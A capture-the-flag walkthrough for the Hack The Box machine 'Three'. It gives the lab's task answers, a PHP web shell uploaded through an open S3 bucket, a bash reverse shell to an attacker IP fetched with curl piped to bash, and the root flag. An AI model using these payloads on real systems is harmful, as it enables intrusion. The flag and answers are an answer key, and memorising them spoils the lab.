# Three

> Task 1 - How many TCP ports are open? 

```
2
```

> Task 2 - What is the domain of the email address provided in the "Contact" section of the website? 

```bash
# Use the raw IP, then add to /etc/hosts
thetoppers.htb
```

> Task 3 - In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 

```bash
/etc/hosts
```

> Task 4 - Which sub-domain is discovered during further enumeration? 
```bash
gobuster vhost -w ../SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -o gobuster.vhost.out
```
```
s3.thetoppers.htb
```

> Task 5 - Which service is running on the discovered sub-domain? 

```
Amazon S3
```

> Task 6 - Which command line utility can be used to interact with the service running on the discovered sub-domain? 

```
awscli
```

> Task 7 - Which command is used to set up the AWS CLI installation? 

```bash
aws configure
```

> Task 8 - What is the command used by the above utility to list all of the S3 buckets? 

```bash
aws s3 ls
```

> Task 9 - This server is configured to run files written in what web scripting language? 

```
php
```

> Submit root flag

```bash
# Configure cli with fake creds (i.e. values of tmp, tmp etc.)
aws --endpoint=http://s3.thetoppers.htb s3 ls
2023-11-18 21:28:12 thetoppers.htb
```
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2023-11-18 21:28:12          0 .htaccess
2023-11-18 21:28:12      11952 index.php
```
```bash
mkdir bucket_contents && cd bucket_contents && \
aws --endpoint=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb . --recursive
```
```bash
echo '<?php system($_GET["command"]); ?>' > lfi.php && \
aws --endpoint=http://s3.thetoppers.htb s3 cp lfi.php s3://thetoppers.htb
```
```bash
curl -k -s http://thetoppers.htb/lfi.php\?command\=uptime
 23:14:24 up  1:46,  0 users,  load average: 0.00, 0.01, 0.00
```
```bash
# create reverse.sh with below
#!/bin/bash
bash -i >& /dev/tcp/$YOUR_IP/9999 0>&1
```
```bash
# start webserver
python -m http.server -b 0.0.0.0
# new shell, listen for reverse shell
nc -nvlp 9999
# new shell, curl the webserver to get and execute reverse.sh
curl http://thetoppers.htb/lfi.php\?command\=curl%20<IP>:8000/reverse.sh\|bash
www-data@three:/var/www/html$ # popped box
```
```bash
cd ~ && cat flag.txt
```
```
HTB{a980d99281a28d638ac68b9bf9453c2b}
```
